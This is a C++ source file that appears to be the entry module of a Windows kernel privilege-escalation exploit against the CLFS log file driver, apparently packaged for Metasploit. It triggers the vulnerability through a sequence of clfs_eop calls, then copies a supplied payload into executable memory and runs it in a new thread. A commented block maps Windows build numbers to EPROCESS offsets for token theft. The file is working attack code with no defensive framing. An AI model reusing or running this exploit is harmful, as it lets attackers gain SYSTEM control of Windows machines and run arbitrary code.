#pragma once
#define DEBUGTRACE 1
#include "common.h"
#include "clfs_eop.h"
#include "exploit.h"\
#include <tchar.h>

//const EPROCESS_OFFSETS* g_pEprocessOffsets = NULL;
//fNtQuerySystemInformation NtQuerySystemInfo = NULL;
//fRtlGetNtVersionNumbers RtlGetNtVersionNumbers = NULL;

void ExecutePayload(PMSF_PAYLOAD pMsfPayload) {
	if (!pMsfPayload)
		return;
	PVOID pPayload = VirtualAlloc(NULL, pMsfPayload->dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pPayload)
		return;
	CopyMemory(pPayload, &pMsfPayload->cPayloadData, pMsfPayload->dwSize);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pPayload, NULL, 0, NULL);
}

BOOL ResolveRequirements(DWORD dwMajor, DWORD dwMinor, DWORD dwBuild) {

	//dwBuild = LOWORD(dwBuild);
	////dprintf("[*] Windows version: %u.%u.%u", dwMajor, dwMinor, dwBuild);
	//if ((dwMajor == 10) && (dwMinor == 0)) {
	//	if ((dwBuild >= 14393) && (dwBuild <= 19045)) {
	//		if ((dwBuild < 15063)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v1607;
	//		}
	//		else if ((dwBuild < 16299)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v1703;
	//		}
	//		else if ((dwBuild < 17134)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v1709;
	//		}
	//		else if ((dwBuild < 17763)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v1803;
	//		}
	//		else if ((dwBuild < 18362)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v1809;
	//		}
	//		else if ((dwBuild < 19041)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v1903;
	//		}
	//		else if ((dwBuild < 19043)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v2004;
	//		}
	//		else if ((dwBuild == 19044)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v21H2;
	//		}
	//		else if ((dwBuild == 19045)) {
	//			g_pEprocessOffsets = &EprocessOffsetsWin10v21H2;
	//		}
	//	}
	//	else if (dwBuild == 22000) {
	//		g_pEprocessOffsets = &EprocessOffsetsWin11v21H2;
	//	}
	//	else if (dwBuild == 20348) {
	//		g_pEprocessOffsets = &EprocessOffsetsWinServer2022;
	//	}
	//}
	//else {
	//	return FALSE;
	//}
	return TRUE;
}


DWORD Exploit(PMSF_PAYLOAD pPayload) {	

	clfs_eop ce = clfs_eop::clfs_eop();
	
	//TODO: Remove manage_args function and set token offsets based on determined windows verion.
	TCHAR* argv[] = { _T("program.exe"), _T("arg1"), _T("arg2") };
	ce.manage_args(2, argv);

	ce.getVirtualAddress();
	ce.InitEnvironment();
	ce.doFirstAlloc();
	ce.createInitialLogFile();
	ce.fun_prepare();
	ce.to_trigger();

	dprintf("Aboue to execute pPayload");
	ExecutePayload(pPayload);

	return 0;
}